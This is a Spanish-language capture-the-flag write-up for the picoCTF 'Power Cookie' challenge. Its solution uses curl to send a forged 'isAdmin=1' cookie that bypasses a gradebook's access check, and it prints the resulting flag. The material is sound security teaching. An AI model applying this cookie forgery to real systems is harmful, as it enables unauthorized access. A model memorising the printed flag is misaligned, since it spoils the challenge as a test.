# Power Cookie

## Descripción
¿Puedes conseguir la bandera?
Visite este [sitio web](http://saturn.picoctf.net:57329/) y vea lo que puede descubrir.

## Pistas
- ¿Sabes cómo modificar las cookies?

## Solución
```bash
┌──(kali㉿kali)-[~]
└─$ curl http://saturn.picoctf.net:57329/                                  
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Secure Log In</title>
  </head>
  <body>
    <script src="guest.js"></script>

    <h1>Online Gradebook</h1>
    <button type="button" onclick="continueAsGuest();">Continue as guest</button>
  </body>
</html>
                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ curl http://saturn.picoctf.net:57329/check.php                         




<html>
<body>



<p>Please visit our <a href='/'>homepage</a> and continue as guest.</p>


</body>
</html>
                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ curl http://saturn.picoctf.net:57329/check.php -H "Cookie: isAdmin=1"




<html>
<body>



<p>picoCTF{gr4d3_A_c00k13_65fd1e1a}</p>


</body>
</html>
```

## Bandera
picoCTF{gr4d3_A_c00k13_65fd1e1a}

## Notas adicionales
| Comando | Descripción |
|--------|--------|
| curl -H | Nos permite alterar datos del encabezado |

## Referencias
[Cómo usar el comando curl de Linux](https://www.hostgator.mx/blog/comando-curl-linux/)